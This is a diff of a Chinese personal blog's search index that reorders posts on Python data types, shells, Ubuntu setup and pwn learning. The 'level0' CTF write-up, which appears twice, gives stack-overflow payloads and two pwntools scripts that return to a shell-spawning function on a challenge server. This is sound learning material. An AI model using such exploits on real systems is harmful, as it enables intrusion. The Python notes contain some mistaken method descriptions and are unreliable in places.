@@ -38,170 +38,6 @@
       </tags>
   </entry>
   <entry>
-    <title>python基本数据类型</title>
-    <url>/2019/08/08/python/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-
-
-<p>python在写代码时不用声明变量</p>
-<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
-数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
-其中包括他们的基本用法和其常用的方法，这里会一一列举出来
-然后我们还需要了解一些运算符，
-因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
-<p>1、数字  —&gt; int类</p>
-<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
-<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
-<p>2、布尔值  </p>
-<p>—&gt;bool类
-　　</p>
-<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
-<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
-<p>—》</p>
-<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
-<p>3、字符串  </p>
-<p>—&gt;str类</p>
-<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
-<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
-<p>#一</p>
-<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
-
-截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
-             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
-<p>索引         index()、find()</p>
-<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
-<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
-#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
-
-        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
-<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
-<pre><code>#删除字符串，也是删除变量
-&gt;&gt;&gt; name =&quot;little-five&quot;
-&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
-<pre><code>isalnum()    #判断是否全为数字
-isalpha()    #判断是否全为字母
-isdigit()    #判断是否全为数字或者字母
-
-返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
-<pre><code>#大小写的互相转换    s.swapcase()
-#首字母大写        s.capitalize()
-#全部转为小写        s.lower()
-#全部转为大写        s.upper()</code></pre><p>jion方法</p>
-<pre><code>#join--&gt; join(): 连接字符串数组。
-将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
-
-#字符串
-name =&quot;littefive&quot;
-&quot;-&quot;.join(name)
-&apos;l-i-t-t-e-f-i-v-e&apos;
-
-#列表
-info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
-&quot;--&quot;.join(info)
-&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
-<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
- #或者
-names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
-<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
-<p>　pop()        取出</p>
-<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
-
-name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
-special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
-<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
-<pre><code>#元组
-name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
-print(name[0])</code></pre><p>#四.<br>字典        dict类
-　　　 </p>
-<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
-　</p>
-<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
-<p>而值的定义可以是任意数据类型。</p>
-<pre><code>#字典的定义
-
-info ={
-    1:&quot;hello world&quot;,  #键为数字
-    (&quot;hello world&quot;):1, #键为元组
-    False:{&quot;name&quot;:&quot;James&quot;},
-    &quot;age&quot;:22
-}    </code></pre><p>遍历        items、keys、values</p>
-<pre><code>info ={
-   &quot;name&quot;:&quot;little-five&quot;,
-   &quot;age&quot;:22,
-   &quot;email&quot;:&quot;99426353*@qq,com&quot;
-}
-#键
-for key in info:
-    print(key)
-    print(info.keys())
-    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>语言基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>drops做题收获</title>
     <url>/2019/08/08/p/</url>
     <content><![CDATA[<a id="more"></a>
@@ -324,6 +160,66 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       </tags>
   </entry>
   <entry>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
+]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/2020/03/04/share/</url>
     <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
@@ -408,6 +304,133 @@ CMD [&quot;app.py&quot;]
 这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
+    <title>shell</title>
+    <url>/2019/10/09/shell/</url>
+    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
+<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
+<p>#基本上shell分两大类：</p>
+<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
+<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
+<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
+
+文字操作系统与外部最主要的接口就叫做shell。
+shell是操作系统最外面的一层。
+shell管理你与操作系统之间的交互：
+等待你输入，向操作系统解释你的输入，
+并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
+<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
+<p>###交互式shell和非交互式shell</p>
+<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
+]]></content>
+      <tags>
+        <tag>计算机基础概念</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python基本数据类型</title>
+    <url>/2019/08/08/python/</url>
+    <content><![CDATA[<a id="more"></a>
+
+
+
+
+<p>python在写代码时不用声明变量</p>
+<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
+数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
+其中包括他们的基本用法和其常用的方法，这里会一一列举出来
+然后我们还需要了解一些运算符，
+因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
+<p>1、数字  —&gt; int类</p>
+<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
+<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
+<p>2、布尔值  </p>
+<p>—&gt;bool类
+　　</p>
+<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
+<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
+<p>—》</p>
+<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
+<p>3、字符串  </p>
+<p>—&gt;str类</p>
+<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
+<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
+<p>#一</p>
+<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
+
+截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
+             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
+<p>索引         index()、find()</p>
+<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
+<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
+#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
+
+        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
+<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
+<pre><code>#删除字符串，也是删除变量
+&gt;&gt;&gt; name =&quot;little-five&quot;
+&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
+<pre><code>isalnum()    #判断是否全为数字
+isalpha()    #判断是否全为字母
+isdigit()    #判断是否全为数字或者字母
+
+返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
+<pre><code>#大小写的互相转换    s.swapcase()
+#首字母大写        s.capitalize()
+#全部转为小写        s.lower()
+#全部转为大写        s.upper()</code></pre><p>jion方法</p>
+<pre><code>#join--&gt; join(): 连接字符串数组。
+将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
+
+#字符串
+name =&quot;littefive&quot;
+&quot;-&quot;.join(name)
+&apos;l-i-t-t-e-f-i-v-e&apos;
+
+#列表
+info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
+&quot;--&quot;.join(info)
+&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
+<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
+ #或者
+names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
+<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
+<p>　pop()        取出</p>
+<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
+
+name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
+special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
+<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
+<pre><code>#元组
+name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
+print(name[0])</code></pre><p>#四.<br>字典        dict类
+　　　 </p>
+<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
+　</p>
+<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
+<p>而值的定义可以是任意数据类型。</p>
+<pre><code>#字典的定义
+
+info ={
+    1:&quot;hello world&quot;,  #键为数字
+    (&quot;hello world&quot;):1, #键为元组
+    False:{&quot;name&quot;:&quot;James&quot;},
+    &quot;age&quot;:22
+}    </code></pre><p>遍历        items、keys、values</p>
+<pre><code>info ={
+   &quot;name&quot;:&quot;little-five&quot;,
+   &quot;age&quot;:22,
+   &quot;email&quot;:&quot;99426353*@qq,com&quot;
+}
+#键
+for key in info:
+    print(key)
+    print(info.keys())
+    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>语言基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>stack2</title>
     <url>/2019/10/11/stack2/</url>
     <content><![CDATA[<p>1.file命令查看为32位</p>
@@ -477,29 +500,6 @@ io.interactive()    </code></pre>]]></content>
       </tags>
   </entry>
   <entry>
-    <title>shell</title>
-    <url>/2019/10/09/shell/</url>
-    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
-<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
-<p>#基本上shell分两大类：</p>
-<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
-<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
-<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
-
-文字操作系统与外部最主要的接口就叫做shell。
-shell是操作系统最外面的一层。
-shell管理你与操作系统之间的交互：
-等待你输入，向操作系统解释你的输入，
-并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
-<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
-<p>###交互式shell和非交互式shell</p>
-<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
-]]></content>
-      <tags>
-        <tag>计算机基础概念</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>stack</title>
     <url>/2019/09/27/stack_explain/</url>
     <content><![CDATA[<a id="more"></a>
@@ -551,6 +551,53 @@ esp  </code></pre><p>待更新。。</p>
       </tags>
   </entry>
   <entry>
+    <title>ubuntu16.04配置</title>
+    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
+<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
+<p>#拍快照</p>
+<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
+<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
+<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
+https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
+https://www.cnblogs.com/flyinggod/p/7979108.html
+不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+
+解决问题E: Could not get lock /var/lib/apt/lists/lock
+https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update
+
+网址    https://www.jianshu.com/p/568aab038d4c
+    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<pre><code>sudo mkdir ~/.pip/
+cd ./.pip/
+touch pip.conf
+sudo gedit pip.conf 
+
+网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
+        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
+<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>链接</title>
+    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>通用gadget原理分析</title>
     <url>/2019/11/01/%E9%80%9A%E7%94%A8gadget%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>通用 gadget</p>
@@ -599,52 +646,5 @@ esp  </code></pre><p>待更新。。</p>
       <tags>
         <tag>pwn学习</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>ubuntu16.04配置</title>
-    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
